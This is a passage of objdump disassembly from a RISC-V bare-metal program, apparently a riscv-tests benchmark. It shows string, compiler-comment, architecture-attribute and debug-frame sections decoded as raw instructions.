 7f6:	69735f73          	csrrwi	t5,0x697,6
 7fa:	657a                	ld	a0,408(sp)
 7fc:	7400                	ld	s0,40(s0)
 7fe:	7268                	ld	a0,224(a2)
 800:	6165                	addi	sp,sp,112
 802:	5f64                	lw	s1,124(a4)
 804:	6f70                	ld	a2,216(a4)
 806:	6e69                	lui	t3,0x1a
 808:	6574                	ld	a3,200(a0)
 80a:	0072                	c.slli	zero,0x1c
 80c:	6e756f63          	bltu	a0,t2,f0a <_tbss_end+0xe86>
 810:	6574                	ld	a3,200(a0)
 812:	5f72                	lw	t5,60(sp)
 814:	616e                	ld	sp,216(sp)
 816:	656d                	lui	a0,0x1b
 818:	6f770073          	0x6f770073
 81c:	6472                	ld	s0,280(sp)
 81e:	5f00                	lw	s0,56(a4)
 820:	6274                	ld	a3,192(a2)
 822:	655f7373          	csrrci	t1,0x655,30
 826:	646e                	ld	s0,216(sp)
 828:	7400                	ld	s0,40(s0)
 82a:	736f686f          	jal	a6,f6f60 <_tbss_end+0xf6edc>
 82e:	0074                	addi	a3,sp,12
 830:	6964                	ld	s1,208(a0)
 832:	73007367          	0x73007367
 836:	7270                	ld	a2,224(a2)
 838:	6e69                	lui	t3,0x1a
 83a:	6674                	ld	a3,200(a2)
 83c:	705f 7475 6863      	0x68637475705f
 842:	6200                	ld	s0,0(a2)
 844:	7479                	lui	s0,0xffffe
 846:	0065                	c.nop	25
 848:	7270                	ld	a2,224(a2)
 84a:	6e69                	lui	t3,0x1a
 84c:	6874                	ld	a3,208(s0)
 84e:	7865                	lui	a6,0xffff9
 850:	7400                	ld	s0,40(s0)
 852:	7268                	ld	a0,224(a2)
 854:	6165                	addi	sp,sp,112
 856:	7364                	ld	s1,224(a4)
 858:	6e65                	lui	t3,0x19
 85a:	74006573          	csrrsi	a0,0x740,0
 85e:	7365                	lui	t1,0xffff9
 860:	0074                	addi	a3,sp,12
 862:	6270                	ld	a2,192(a2)
 864:	6675                	lui	a2,0x1d
 866:	6d00                	ld	s0,24(a0)
 868:	6761                	lui	a4,0x18
 86a:	6369                	lui	t1,0x1a
 86c:	6d5f 6d65 7400      	0x74006d656d5f
 872:	736f686f          	jal	a6,f6fa8 <_tbss_end+0xf6f24>
 876:	5f74                	lw	a3,124(a4)
 878:	7865                	lui	a6,0xffff9
 87a:	7469                	lui	s0,0xffffa
 87c:	6600                	ld	s0,8(a2)
 87e:	6f72                	ld	t5,280(sp)
 880:	686d                	lui	a6,0x1b
 882:	0074736f          	jal	t1,48088 <_tbss_end+0x48004>
 886:	656d                	lui	a0,0x1b
 888:	636d                	lui	t1,0x1b
 88a:	7970                	ld	a2,240(a0)
 88c:	5f00                	lw	s0,56(a4)
 88e:	625f 6975 746c      	0x746c6975625f
 894:	6e69                	lui	t3,0x1a
 896:	765f 5f61 696c      	0x696c5f61765f
 89c:	61007473          	csrrci	s0,0x610,0
 8a0:	6f74                	ld	a3,216(a4)
 8a2:	006c                	addi	a1,sp,12
 8a4:	53746573          	csrrsi	a0,0x537,8
 8a8:	6174                	ld	a3,192(a0)
 8aa:	7374                	ld	a3,224(a4)
 8ac:	6900                	ld	s0,16(a0)
 8ae:	696e                	ld	s2,216(sp)
 8b0:	5f74                	lw	a3,124(a4)
 8b2:	6c74                	ld	a3,216(s0)
 8b4:	65760073          	0x65760073
 8b8:	6972                	ld	s2,280(sp)
 8ba:	7966                	ld	s2,120(sp)
 8bc:	6400                	ld	s0,8(s0)
 8be:	7365                	lui	t1,0xffff9
 8c0:	0074                	addi	a3,sp,12
 8c2:	7076                	0x7076
 8c4:	6972                	ld	s2,280(sp)
 8c6:	746e                	ld	s0,248(sp)
 8c8:	6d66                	ld	s10,88(sp)
 8ca:	0074                	addi	a3,sp,12

Disassembly of section .comment:

0000000000000000 <.comment>:
   0:	3a434347          	fmsub.d	ft6,ft6,ft4,ft7,rmm
   4:	2820                	fld	fs0,80(s0)
   6:	29554e47          	fmsub.s	ft8,fa0,fs5,ft5,rmm
   a:	3920                	fld	fs0,112(a0)
   c:	322e                	fld	ft4,232(sp)
   e:	302e                	fld	ft0,232(sp)
	...

Disassembly of section .riscv.attributes:

0000000000000000 <.riscv.attributes>:
   0:	3441                	addiw	s0,s0,-16
   2:	0000                	unimp
   4:	7200                	ld	s0,32(a2)
   6:	7369                	lui	t1,0xffffa
   8:	01007663          	bgeu	zero,a6,14 <_tdata_begin+0x14>
   c:	002a                	c.slli	zero,0xa
   e:	0000                	unimp
  10:	1004                	addi	s1,sp,32
  12:	7205                	lui	tp,0xfffe1
  14:	3676                	fld	fa2,376(sp)
  16:	6934                	ld	a3,80(a0)
  18:	7032                	0x7032
  1a:	5f30                	lw	a2,120(a4)
  1c:	326d                	addiw	tp,tp,-5
  1e:	3070                	fld	fa2,224(s0)
  20:	615f 7032 5f30      	0x5f307032615f
  26:	3266                	fld	ft4,120(sp)
  28:	3070                	fld	fa2,224(s0)
  2a:	645f 7032 5f30      	0x5f307032645f
  30:	30703263          	0x30703263
	...

Disassembly of section .debug_frame:

0000000000000000 <.debug_frame>:
   0:	000c                	0xc
   2:	0000                	unimp
   4:	ffff                	0xffff
   6:	ffff                	0xffff
   8:	0001                	nop
   a:	7c01                	lui	s8,0xfffe0
   c:	0d01                	addi	s10,s10,0
   e:	0002                	c.slli64	zero
  10:	002c                	addi	a1,sp,8
  12:	0000                	unimp
  14:	0000                	unimp
  16:	0000                	unimp
  18:	1048                	addi	a0,sp,36
  1a:	8000                	0x8000
  1c:	0000                	unimp
  1e:	0000                	unimp
  20:	00d0                	addi	a2,sp,68
  22:	0000                	unimp
  24:	0000                	unimp
  26:	0000                	unimp
  28:	0e42                	slli	t3,t3,0x10
  2a:	4260                	lw	s0,68(a2)
  2c:	0288                	addi	a0,sp,320
  2e:	0c42                	slli	s8,s8,0x10
  30:	0008                	0x8
  32:	c602                	sw	zero,12(sp)
  34:	0cc8                	addi	a0,sp,596
  36:	6002                	0x6002
  38:	0e42                	slli	t3,t3,0x10
  3a:	0000                	unimp
  3c:	0000                	unimp
  3e:	0000                	unimp
  40:	002c                	addi	a1,sp,8
  42:	0000                	unimp
  44:	0000                	unimp
  46:	0000                	unimp
  48:	1118                	addi	a4,sp,160
  4a:	8000                	0x8000
  4c:	0000                	unimp
  4e:	0000                	unimp
  50:	00ee                	slli	ra,ra,0x1b
  52:	0000                	unimp
  54:	0000                	unimp
  56:	0000                	unimp
  58:	0e42                	slli	t3,t3,0x10
  5a:	4240                	lw	s0,4(a2)
  5c:	0288                	addi	a0,sp,320
  5e:	0c42                	slli	s8,s8,0x10
  60:	0008                	0x8
  62:	e402                	sd	zero,8(sp)
  64:	0cc8                	addi	a0,sp,596
  66:	4002                	0x4002
  68:	0e42                	slli	t3,t3,0x10
  6a:	0000                	unimp
  6c:	0000                	unimp
  6e:	0000                	unimp
  70:	002c                	addi	a1,sp,8
  72:	0000                	unimp
  74:	0000                	unimp
  76:	0000                	unimp
  78:	1206                	slli	tp,tp,0x21
  7a:	8000                	0x8000
  7c:	0000                	unimp
  7e:	0000                	unimp
  80:	00b2                	slli	ra,ra,0xc
  82:	0000                	unimp
  84:	0000                	unimp
  86:	0000                	unimp
  88:	0e42                	slli	t3,t3,0x10
  8a:	4230                	lw	a2,64(a2)
  8c:	0288                	addi	a0,sp,320
  8e:	0c42                	slli	s8,s8,0x10
  90:	0008                	0x8
  92:	a802                	fsd	ft0,16(sp)
  94:	0cc8                	addi	a0,sp,596
  96:	3002                	fld	ft0,32(sp)
  98:	0e42                	slli	t3,t3,0x10
  9a:	0000                	unimp
  9c:	0000                	unimp
  9e:	0000                	unimp
  a0:	0034                	addi	a3,sp,8
  a2:	0000                	unimp
  a4:	0000                	unimp
  a6:	0000                	unimp
  a8:	12b8                	addi	a4,sp,360
  aa:	8000                	0x8000
  ac:	0000                	unimp
  ae:	0000                	unimp
  b0:	0318                	addi	a4,sp,384
  b2:	0000                	unimp
  b4:	0000                	unimp
  b6:	0000                	unimp
  b8:	0e42                	slli	t3,t3,0x10
  ba:	01b0                	addi	a2,sp,200
  bc:	8144                	0x8144
  be:	8802                	jr	a6
  c0:	4204                	lw	s1,0(a2)
  c2:	080c                	addi	a1,sp,16
  c4:	0300                	addi	s0,sp,384
  c6:	030a                	slli	t1,t1,0x2
  c8:	42c1                	li	t0,16
  ca:	0cc8                	addi	a0,sp,596
  cc:	b002                	fsd	ft0,32(sp)
  ce:	4201                	li	tp,0
  d0:	000e                	c.slli	zero,0x3
  d2:	0000                	unimp
  d4:	0000                	unimp
  d6:	0000                	unimp
  d8:	000c                	0xc
  da:	0000                	unimp
  dc:	ffff                	0xffff
  de:	ffff                	0xffff
  e0:	0001                	nop
  e2:	7c01                	lui	s8,0xfffe0
  e4:	0d01                	addi	s10,s10,0
  e6:	0002                	c.slli64	zero
  e8:	002c                	addi	a1,sp,8
  ea:	0000                	unimp
  ec:	00d8                	addi	a4,sp,68
  ee:	0000                	unimp
  f0:	15fe                	slli	a1,a1,0x3f
  f2:	8000                	0x8000
  f4:	0000                	unimp
  f6:	0000                	unimp
  f8:	001c                	0x1c
  fa:	0000                	unimp
  fc:	0000                	unimp
  fe:	0000                	unimp
 100:	0e42                	slli	t3,t3,0x10
 102:	4230                	lw	a2,64(a2)
 104:	0288                	addi	a0,sp,320
 106:	0c42                	slli	s8,s8,0x10
 108:	0008                	0x8
 10a:	c852                	sw	s4,16(sp)
 10c:	020c                	addi	a1,sp,256
 10e:	4230                	lw	a2,64(a2)
 110:	000e                	c.slli	zero,0x3
 112:	0000                	unimp
 114:	0000                	unimp
 116:	0000                	unimp
 118:	002c                	addi	a1,sp,8
 11a:	0000                	unimp
 11c:	00d8                	addi	a4,sp,68
 11e:	0000                	unimp
 120:	161a                	slli	a2,a2,0x26
 122:	8000                	0x8000
 124:	0000                	unimp
 126:	0000                	unimp
 128:	001c                	0x1c
 12a:	0000                	unimp
 12c:	0000                	unimp
 12e:	0000                	unimp
 130:	0e42                	slli	t3,t3,0x10
 132:	4230                	lw	a2,64(a2)
 134:	0288                	addi	a0,sp,320
 136:	0c42                	slli	s8,s8,0x10
 138:	0008                	0x8
 13a:	c852                	sw	s4,16(sp)
 13c:	020c                	addi	a1,sp,256
 13e:	4230                	lw	a2,64(a2)
 140:	000e                	c.slli	zero,0x3
 142:	0000                	unimp
 144:	0000                	unimp
 146:	0000                	unimp
 148:	002c                	addi	a1,sp,8
 14a:	0000                	unimp
 14c:	00d8                	addi	a4,sp,68
 14e:	0000                	unimp
 150:	1636                	slli	a2,a2,0x2d
 152:	8000                	0x8000
 154:	0000                	unimp
 156:	0000                	unimp
 158:	010a                	slli	sp,sp,0x2
 15a:	0000                	unimp
 15c:	0000                	unimp
 15e:	0000                	unimp
 160:	0e42                	slli	t3,t3,0x10
 162:	4250                	lw	a2,4(a2)
 164:	0288                	addi	a0,sp,320
 166:	0c42                	slli	s8,s8,0x10
 168:	0008                	0x8
 16a:	c8010003          	lb	zero,-896(sp)
 16e:	020c                	addi	a1,sp,256
 170:	4250                	lw	a2,4(a2)
 172:	000e                	c.slli	zero,0x3
 174:	0000                	unimp
 176:	0000                	unimp
 178:	002c                	addi	a1,sp,8
 17a:	0000                	unimp
 17c:	00d8                	addi	a4,sp,68
 17e:	0000                	unimp
 180:	1740                	addi	s0,sp,932
 182:	8000                	0x8000
 184:	0000                	unimp
 186:	0000                	unimp
 188:	0122                	slli	sp,sp,0x8
 18a:	0000                	unimp
 18c:	0000                	unimp
 18e:	0000                	unimp
 190:	0e42                	slli	t3,t3,0x10
 192:	4260                	lw	s0,68(a2)
 194:	0288                	addi	a0,sp,320
 196:	0c42                	slli	s8,s8,0x10
 198:	0008                	0x8
 19a:	c8011803          	lh	a6,-896(sp)
 19e:	020c                	addi	a1,sp,256
 1a0:	4260                	lw	s0,68(a2)
 1a2:	000e                	c.slli	zero,0x3
 1a4:	0000                	unimp
 1a6:	0000                	unimp
 1a8:	002c                	addi	a1,sp,8
 1aa:	0000                	unimp
 1ac:	00d8                	addi	a4,sp,68
 1ae:	0000                	unimp
 1b0:	1862                	slli	a6,a6,0x38
 1b2:	8000                	0x8000
 1b4:	0000                	unimp
 1b6:	0000                	unimp
 1b8:	008a                	slli	ra,ra,0x2
 1ba:	0000                	unimp
 1bc:	0000                	unimp
 1be:	0000                	unimp
 1c0:	0e42                	slli	t3,t3,0x10
 1c2:	4220                	lw	s0,64(a2)
 1c4:	0288                	addi	a0,sp,320
 1c6:	0c42                	slli	s8,s8,0x10
 1c8:	0008                	0x8
 1ca:	8002                	0x8002
 1cc:	0cc8                	addi	a0,sp,596
 1ce:	2002                	fld	ft0,0(sp)
 1d0:	0e42                	slli	t3,t3,0x10
 1d2:	0000                	unimp
 1d4:	0000                	unimp
 1d6:	0000                	unimp
 1d8:	002c                	addi	a1,sp,8
 1da:	0000                	unimp
 1dc:	00d8                	addi	a4,sp,68
 1de:	0000                	unimp
 1e0:	18ec                	addi	a1,sp,124
 1e2:	8000                	0x8000
 1e4:	0000                	unimp
 1e6:	0000                	unimp
 1e8:	0036                	c.slli	zero,0xd
 1ea:	0000                	unimp
 1ec:	0000                	unimp
 1ee:	0000                	unimp
 1f0:	0e42                	slli	t3,t3,0x10
 1f2:	4230                	lw	a2,64(a2)
 1f4:	0288                	addi	a0,sp,320
 1f6:	0c42                	slli	s8,s8,0x10
 1f8:	0008                	0x8
 1fa:	c86c                	sw	a1,84(s0)
 1fc:	020c                	addi	a1,sp,256
 1fe:	4230                	lw	a2,64(a2)
 200:	000e                	c.slli	zero,0x3
 202:	0000                	unimp
 204:	0000                	unimp
 206:	0000                	unimp
 208:	002c                	addi	a1,sp,8
 20a:	0000                	unimp
 20c:	00d8                	addi	a4,sp,68
 20e:	0000                	unimp
 210:	1922                	slli	s2,s2,0x28
 212:	8000                	0x8000
 214:	0000                	unimp
 216:	0000                	unimp
 218:	007e                	c.slli	zero,0x1f
 21a:	0000                	unimp
 21c:	0000                	unimp
 21e:	0000                	unimp
 220:	0e42                	slli	t3,t3,0x10
 222:	01b0                	addi	a2,sp,200
 224:	8842                	mv	a6,a6
 226:	4202                	lw	tp,0(sp)
 228:	080c                	addi	a1,sp,16
 22a:	0200                	addi	s0,sp,256
 22c:	c874                	sw	a3,84(s0)
 22e:	020c                	addi	a1,sp,256
 230:	01b0                	addi	a2,sp,200
 232:	0e42                	slli	t3,t3,0x10
 234:	0000                	unimp
 236:	0000                	unimp
 238:	002c                	addi	a1,sp,8
 23a:	0000                	unimp
 23c:	00d8                	addi	a4,sp,68
 23e:	0000                	unimp
 240:	19a0                	addi	s0,sp,248
 242:	8000                	0x8000
 244:	0000                	unimp
 246:	0000                	unimp
 248:	0110                	addi	a2,sp,128
 24a:	0000                	unimp
 24c:	0000                	unimp
 24e:	0000                	unimp
 250:	0e42                	slli	t3,t3,0x10
 252:	4250                	lw	a2,4(a2)
 254:	0288                	addi	a0,sp,320
 256:	0c42                	slli	s8,s8,0x10
 258:	0008                	0x8
 25a:	c8010603          	lb	a2,-896(sp)
 25e:	020c                	addi	a1,sp,256
 260:	4250                	lw	a2,4(a2)
 262:	000e                	c.slli	zero,0x3
 264:	0000                	unimp
 266:	0000                	unimp
 268:	0024                	addi	s1,sp,8
 26a:	0000                	unimp
 26c:	00d8                	addi	a4,sp,68
 26e:	0000                	unimp
 270:	1ab0                	addi	a2,sp,376
 272:	8000                	0x8000
 274:	0000                	unimp
 276:	0000                	unimp
 278:	0020                	addi	s0,sp,8
 27a:	0000                	unimp
 27c:	0000                	unimp
 27e:	0000                	unimp
 280:	0e42                	slli	t3,t3,0x10
 282:	4220                	lw	s0,64(a2)
 284:	0288                	addi	a0,sp,320
 286:	0c42                	slli	s8,s8,0x10
 288:	0008                	0x8
 28a:	0000                	unimp
 28c:	0000                	unimp
 28e:	0000                	unimp
 290:	0024                	addi	s1,sp,8
 292:	0000                	unimp
 294:	00d8                	addi	a4,sp,68
 296:	0000                	unimp
 298:	1ad0                	addi	a2,sp,372
 29a:	8000                	0x8000
 29c:	0000                	unimp
 29e:	0000                	unimp
 2a0:	001c                	0x1c
 2a2:	0000                	unimp
 2a4:	0000                	unimp
 2a6:	0000                	unimp
 2a8:	0e42                	slli	t3,t3,0x10
 2aa:	4430                	lw	a2,72(s0)
 2ac:	0281                	addi	t0,t0,0
 2ae:	0488                	addi	a0,sp,576
 2b0:	0c42                	slli	s8,s8,0x10
 2b2:	0008                	0x8
 2b4:	0000                	unimp
 2b6:	0000                	unimp
 2b8:	0024                	addi	s1,sp,8
 2ba:	0000                	unimp
 2bc:	00d8                	addi	a4,sp,68
 2be:	0000                	unimp
 2c0:	1aec                	addi	a1,sp,380
 2c2:	8000                	0x8000
 2c4:	0000                	unimp
 2c6:	0000                	unimp
 2c8:	0018                	0x18
 2ca:	0000                	unimp
 2cc:	0000                	unimp
 2ce:	0000                	unimp
 2d0:	0e42                	slli	t3,t3,0x10
 2d2:	4420                	lw	s0,72(s0)
 2d4:	0281                	addi	t0,t0,0
 2d6:	0488                	addi	a0,sp,576
 2d8:	0c42                	slli	s8,s8,0x10
 2da:	0008                	0x8
 2dc:	0000                	unimp
 2de:	0000                	unimp
 2e0:	0024                	addi	s1,sp,8
 2e2:	0000                	unimp
 2e4:	00d8                	addi	a4,sp,68
 2e6:	0000                	unimp
 2e8:	1b04                	addi	s1,sp,432
 2ea:	8000                	0x8000
 2ec:	0000                	unimp
 2ee:	0000                	unimp
 2f0:	0010                	0x10
 2f2:	0000                	unimp
 2f4:	0000                	unimp
 2f6:	0000                	unimp
 2f8:	0e42                	slli	t3,t3,0x10
 2fa:	4410                	lw	a2,8(s0)
 2fc:	0281                	addi	t0,t0,0
 2fe:	0488                	addi	a0,sp,576
 300:	0c42                	slli	s8,s8,0x10
 302:	0008                	0x8
 304:	0000                	unimp
 306:	0000                	unimp
 308:	0034                	addi	a3,sp,8
 30a:	0000                	unimp
 30c:	00d8                	addi	a4,sp,68
 30e:	0000                	unimp
 310:	1b14                	addi	a3,sp,432
 312:	8000                	0x8000
 314:	0000                	unimp
 316:	0000                	unimp
 318:	0036                	c.slli	zero,0xd
 31a:	0000                	unimp
 31c:	0000                	unimp
 31e:	0000                	unimp
 320:	0e42                	slli	t3,t3,0x10
 322:	4630                	lw	a2,72(a2)
 324:	0281                	addi	t0,t0,0
 326:	0488                	addi	a0,sp,576
 328:	0689                	addi	a3,a3,2
 32a:	0c42                	slli	s8,s8,0x10
 32c:	0008                	0x8
 32e:	c164                	sw	s1,68(a0)
 330:	c842                	sw	a6,16(sp)
 332:	020c                	addi	a1,sp,256
 334:	4230                	lw	a2,64(a2)
 336:	42c9                	li	t0,18
 338:	000e                	c.slli	zero,0x3
 33a:	0000                	unimp
 33c:	0000                	unimp
 33e:	0000                	unimp
 340:	002c                	addi	a1,sp,8
 342:	0000                	unimp
 344:	00d8                	addi	a4,sp,68
 346:	0000                	unimp
 348:	1b4a                	slli	s6,s6,0x32
 34a:	8000                	0x8000
 34c:	0000                	unimp
 34e:	0000                	unimp
 350:	0026                	c.slli	zero,0x9
 352:	0000                	unimp
 354:	0000                	unimp
 356:	0000                	unimp
 358:	0e42                	slli	t3,t3,0x10
 35a:	4220                	lw	s0,64(a2)
 35c:	0288                	addi	a0,sp,320
 35e:	0c42                	slli	s8,s8,0x10
 360:	0008                	0x8
 362:	c85c                	sw	a5,20(s0)
 364:	020c                	addi	a1,sp,256
 366:	4220                	lw	s0,64(a2)
 368:	000e                	c.slli	zero,0x3
 36a:	0000                	unimp
 36c:	0000                	unimp
 36e:	0000                	unimp
 370:	002c                	addi	a1,sp,8
 372:	0000                	unimp
 374:	00d8                	addi	a4,sp,68
 376:	0000                	unimp
 378:	1b70                	addi	a2,sp,444
 37a:	8000                	0x8000
 37c:	0000                	unimp
 37e:	0000                	unimp
 380:	002a                	c.slli	zero,0xa
 382:	0000                	unimp
 384:	0000                	unimp
 386:	0000                	unimp
 388:	0e42                	slli	t3,t3,0x10
 38a:	4420                	lw	s0,72(s0)
 38c:	0281                	addi	t0,t0,0
 38e:	0488                	addi	a0,sp,576
 390:	0c42                	slli	s8,s8,0x10
 392:	0008                	0x8
 394:	c15c                	sw	a5,4(a0)
 396:	c842                	sw	a6,16(sp)
 398:	020c                	addi	a1,sp,256
 39a:	4220                	lw	s0,64(a2)
 39c:	000e                	c.slli	zero,0x3
 39e:	0000                	unimp
 3a0:	002c                	addi	a1,sp,8
 3a2:	0000                	unimp
 3a4:	00d8                	addi	a4,sp,68
 3a6:	0000                	unimp
 3a8:	1b9a                	slli	s7,s7,0x26
 3aa:	8000                	0x8000
 3ac:	0000                	unimp
 3ae:	0000                	unimp
 3b0:	005a                	c.slli	zero,0x16
 3b2:	0000                	unimp
 3b4:	0000                	unimp
 3b6:	0000                	unimp
 3b8:	0e42                	slli	t3,t3,0x10
 3ba:	4420                	lw	s0,72(s0)
 3bc:	0281                	addi	t0,t0,0
 3be:	0488                	addi	a0,sp,576
 3c0:	0c42                	slli	s8,s8,0x10
 3c2:	0008                	0x8
 3c4:	4c02                	lw	s8,0(sp)
 3c6:	42c1                	li	t0,16
 3c8:	0cc8                	addi	a0,sp,596
 3ca:	2002                	fld	ft0,0(sp)
 3cc:	0e42                	slli	t3,t3,0x10
 3ce:	0000                	unimp
 3d0:	0024                	addi	s1,sp,8
 3d2:	0000                	unimp
 3d4:	00d8                	addi	a4,sp,68
 3d6:	0000                	unimp
 3d8:	1bf4                	addi	a3,sp,508
 3da:	8000                	0x8000
 3dc:	0000                	unimp
 3de:	0000                	unimp
 3e0:	00e6                	slli	ra,ra,0x19
 3e2:	0000                	unimp
 3e4:	0000                	unimp
 3e6:	0000                	unimp
 3e8:	0e42                	slli	t3,t3,0x10
 3ea:	01b0                	addi	a2,sp,200
 3ec:	8146                	mv	sp,a7
 3ee:	8802                	jr	a6
 3f0:	8904                	0x8904
 3f2:	4206                	lw	tp,64(sp)
 3f4:	080c                	addi	a1,sp,16
 3f6:	0000                	unimp
 3f8:	002c                	addi	a1,sp,8
 3fa:	0000                	unimp
 3fc:	00d8                	addi	a4,sp,68
 3fe:	0000                	unimp
 400:	1cda                	slli	s9,s9,0x36
 402:	8000                	0x8000
 404:	0000                	unimp
 406:	0000                	unimp
 408:	0072                	c.slli	zero,0x1c
 40a:	0000                	unimp
 40c:	0000                	unimp
 40e:	0000                	unimp
 410:	0e42                	slli	t3,t3,0x10
 412:	4420                	lw	s0,72(s0)
 414:	0281                	addi	t0,t0,0
 416:	0488                	addi	a0,sp,576
 418:	0c42                	slli	s8,s8,0x10
 41a:	0008                	0x8
 41c:	6402                	ld	s0,0(sp)
 41e:	42c1                	li	t0,16
 420:	0cc8                	addi	a0,sp,596
 422:	2002                	fld	ft0,0(sp)
 424:	0e42                	slli	t3,t3,0x10
 426:	0000                	unimp
 428:	002c                	addi	a1,sp,8
 42a:	0000                	unimp
 42c:	00d8                	addi	a4,sp,68
 42e:	0000                	unimp
 430:	1d4c                	addi	a1,sp,692
 432:	8000                	0x8000
 434:	0000                	unimp
 436:	0000                	unimp
 438:	008e                	slli	ra,ra,0x3
 43a:	0000                	unimp
 43c:	0000                	unimp
 43e:	0000                	unimp
 440:	0e42                	slli	t3,t3,0x10
 442:	4440                	lw	s0,12(s0)
 444:	0281                	addi	t0,t0,0
 446:	0488                	addi	a0,sp,576
 448:	0c42                	slli	s8,s8,0x10
 44a:	0008                	0x8
 44c:	8002                	0x8002
 44e:	42c1                	li	t0,16
 450:	0cc8                	addi	a0,sp,596
 452:	4002                	0x4002
 454:	0e42                	slli	t3,t3,0x10
 456:	0000                	unimp
 458:	0034                	addi	a3,sp,8
 45a:	0000                	unimp
 45c:	00d8                	addi	a4,sp,68
 45e:	0000                	unimp
 460:	1dda                	slli	s11,s11,0x36
 462:	8000                	0x8000
 464:	0000                	unimp
 466:	0000                	unimp
 468:	0102                	c.slli64	sp
 46a:	0000                	unimp
 46c:	0000                	unimp
 46e:	0000                	unimp
 470:	0e42                	slli	t3,t3,0x10
 472:	02d0                	addi	a2,sp,324
 474:	8144                	0x8144
 476:	8802                	jr	a6
 478:	4204                	lw	s1,0(a2)
 47a:	080c                	addi	a1,sp,16
 47c:	0200                	addi	s0,sp,256
 47e:	c1f4                	sw	a3,68(a1)
 480:	c842                	sw	a6,16(sp)
 482:	020c                	addi	a1,sp,256
 484:	02d0                	addi	a2,sp,324
 486:	0e42                	slli	t3,t3,0x10
	...
 490:	002c                	addi	a1,sp,8
 492:	0000                	unimp
 494:	00d8                	addi	a4,sp,68
 496:	0000                	unimp
 498:	1edc                	addi	a5,sp,884
 49a:	8000                	0x8000
 49c:	0000                	unimp
 49e:	0000                	unimp
 4a0:	006c                	addi	a1,sp,12
 4a2:	0000                	unimp
 4a4:	0000                	unimp
 4a6:	0000                	unimp
 4a8:	0e42                	slli	t3,t3,0x10
 4aa:	4220                	lw	s0,64(a2)
 4ac:	0288                	addi	a0,sp,320
 4ae:	0c42                	slli	s8,s8,0x10
 4b0:	0008                	0x8
 4b2:	6202                	ld	tp,0(sp)
 4b4:	0cc8                	addi	a0,sp,596
 4b6:	2002                	fld	ft0,0(sp)
 4b8:	0e42                	slli	t3,t3,0x10
 4ba:	0000                	unimp
 4bc:	0000                	unimp
 4be:	0000                	unimp
 4c0:	002c                	addi	a1,sp,8
 4c2:	0000                	unimp
 4c4:	00d8                	addi	a4,sp,68
 4c6:	0000                	unimp
 4c8:	1f48                	addi	a0,sp,948
 4ca:	8000                	0x8000
 4cc:	0000                	unimp
 4ce:	0000                	unimp
 4d0:	0068                	addi	a0,sp,12
 4d2:	0000                	unimp
 4d4:	0000                	unimp
 4d6:	0000                	unimp
 4d8:	0e42                	slli	t3,t3,0x10
 4da:	4220                	lw	s0,64(a2)
 4dc:	0288                	addi	a0,sp,320
 4de:	0c42                	slli	s8,s8,0x10
 4e0:	0008                	0x8
 4e2:	5e02                	lw	t3,32(sp)
 4e4:	0cc8                	addi	a0,sp,596
 4e6:	2002                	fld	ft0,0(sp)
 4e8:	0e42                	slli	t3,t3,0x10
 4ea:	0000                	unimp
 4ec:	0000                	unimp
 4ee:	0000                	unimp
 4f0:	0034                	addi	a3,sp,8
 4f2:	0000                	unimp
 4f4:	00d8                	addi	a4,sp,68
 4f6:	0000                	unimp
 4f8:	1fb0                	addi	a2,sp,1016
 4fa:	8000                	0x8000
 4fc:	0000                	unimp
 4fe:	0000                	unimp
 500:	035e                	slli	t1,t1,0x17
 502:	0000                	unimp
 504:	0000                	unimp
 506:	0000                	unimp
 508:	0e42                	slli	t3,t3,0x10
 50a:	4870                	lw	a2,84(s0)
 50c:	0281                	addi	t0,t0,0
 50e:	0488                	addi	a0,sp,576
 510:	0689                	addi	a3,a3,2
 512:	0892                	slli	a7,a7,0x4
 514:	0c42                	slli	s8,s8,0x10
 516:	0008                	0x8
 518:	c1034803          	lbu	a6,-1008(t1) # ffffffffffff9c10 <_end+0xffffffff7ffde750>
 51c:	c842                	sw	a6,16(sp)
 51e:	020c                	addi	a1,sp,256
 520:	4270                	lw	a2,68(a2)
 522:	42c9                	li	t0,18
 524:	42d2                	lw	t0,20(sp)
 526:	000e                	c.slli	zero,0x3
 528:	002c                	addi	a1,sp,8
 52a:	0000                	unimp
 52c:	00d8                	addi	a4,sp,68
 52e:	0000                	unimp
 530:	230e                	fld	ft6,192(sp)
 532:	8000                	0x8000
 534:	0000                	unimp
 536:	0000                	unimp
 538:	0056                	c.slli	zero,0x15
 53a:	0000                	unimp
 53c:	0000                	unimp
 53e:	0000                	unimp
 540:	0e42                	slli	t3,t3,0x10
 542:	4470                	lw	a2,76(s0)
 544:	1281                	addi	t0,t0,-32
 546:	1488                	addi	a0,sp,608
 548:	0c42                	slli	s8,s8,0x10
 54a:	4008                	lw	a0,0(s0)
 54c:	4802                	lw	a6,0(sp)
 54e:	42c1                	li	t0,16
 550:	0cc8                	addi	a0,sp,596
 552:	7002                	0x7002
 554:	0e42                	slli	t3,t3,0x10
 556:	0000                	unimp
 558:	002c                	addi	a1,sp,8
 55a:	0000                	unimp
 55c:	00d8                	addi	a4,sp,68
 55e:	0000                	unimp
 560:	2364                	fld	fs1,192(a4)
 562:	8000                	0x8000
 564:	0000                	unimp
 566:	0000                	unimp
 568:	0046                	c.slli	zero,0x11
 56a:	0000                	unimp
 56c:	0000                	unimp
 56e:	0000                	unimp
 570:	0e42                	slli	t3,t3,0x10
 572:	4240                	lw	s0,4(a2)
 574:	0288                	addi	a0,sp,320
 576:	0c42                	slli	s8,s8,0x10
 578:	0008                	0x8
 57a:	c87c                	sw	a5,84(s0)
 57c:	020c                	addi	a1,sp,256
 57e:	4240                	lw	s0,4(a2)
 580:	000e                	c.slli	zero,0x3
 582:	0000                	unimp
 584:	0000                	unimp
 586:	0000                	unimp
 588:	0034                	addi	a3,sp,8
 58a:	0000                	unimp
 58c:	00d8                	addi	a4,sp,68
 58e:	0000                	unimp
 590:	23aa                	fld	ft7,136(sp)
 592:	8000                	0x8000
 594:	0000                	unimp
 596:	0000                	unimp
 598:	00c2                	slli	ra,ra,0x10
 59a:	0000                	unimp
 59c:	0000                	unimp
 59e:	0000                	unimp
 5a0:	0e42                	slli	t3,t3,0x10
 5a2:	0290                	addi	a2,sp,320
 5a4:	8144                	0x8144
 5a6:	880e                	mv	a6,gp
 5a8:	4210                	lw	a2,0(a2)
 5aa:	080c                	addi	a1,sp,16
 5ac:	0230                	addi	a2,sp,264
 5ae:	c1b4                	sw	a3,64(a1)
 5b0:	c842                	sw	a6,16(sp)
 5b2:	020c                	addi	a1,sp,256
 5b4:	0290                	addi	a2,sp,320
 5b6:	0e42                	slli	t3,t3,0x10
	...
 5c0:	002c                	addi	a1,sp,8
 5c2:	0000                	unimp
